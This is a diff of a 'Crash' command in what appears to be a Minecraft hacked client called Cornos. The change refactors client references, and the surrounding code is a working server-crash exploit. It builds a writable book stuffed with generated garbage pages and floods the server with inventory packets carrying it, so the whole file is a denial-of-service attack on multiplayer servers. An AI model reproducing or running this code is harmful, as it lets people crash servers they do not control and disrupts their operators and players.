@@ -1,8 +1,8 @@
 package me.constantindev.ccl.command;
 
+import me.constantindev.ccl.Cornos;
 import me.constantindev.ccl.etc.base.Command;
 import me.constantindev.ccl.etc.helper.ClientHelper;
-import net.minecraft.client.MinecraftClient;
 import net.minecraft.item.ItemStack;
 import net.minecraft.item.Items;
 import net.minecraft.nbt.CompoundTag;
@@ -34,8 +34,8 @@ public class Crash extends Command {
             ClientHelper.sendChat("Im not sure if " + args[0] + " a number");
             return;
         }
-        assert MinecraftClient.getInstance().player != null;
-        if (!MinecraftClient.getInstance().player.isCreative()) {
+        assert Cornos.minecraft.player != null;
+        if (!Cornos.minecraft.player.isCreative()) {
             ClientHelper.sendChat("It would be helpful if you are in creative. Trying anyways");
         }
         ItemStack stack = new ItemStack(Items.WRITABLE_BOOK);
@@ -46,13 +46,13 @@ public class Crash extends Command {
             StringTag st = StringTag.of(garbage);
             list.add(st);
         }
-        tag.put("author", StringTag.of(MinecraftClient.getInstance().player.getEntityName()));
+        tag.put("author", StringTag.of(Cornos.minecraft.player.getEntityName()));
         tag.put("title", StringTag.of("When you use cornos :flushed:"));
         tag.put("pages", list);
         stack.setTag(tag);
         for (int i = 0; i < amount; i++) {
-            Objects.requireNonNull(MinecraftClient.getInstance().getNetworkHandler()).sendPacket(new CreativeInventoryActionC2SPacket(0, stack));
-            MinecraftClient.getInstance().getNetworkHandler().sendPacket(new ClickSlotC2SPacket(0, 0, 0, SlotActionType.PICKUP, stack, (short) 0));
+            Objects.requireNonNull(Cornos.minecraft.getNetworkHandler()).sendPacket(new CreativeInventoryActionC2SPacket(0, stack));
+            Cornos.minecraft.getNetworkHandler().sendPacket(new ClickSlotC2SPacket(0, 0, 0, SlotActionType.PICKUP, stack, (short) 0));
         }
         super.onExecute(args);
     }
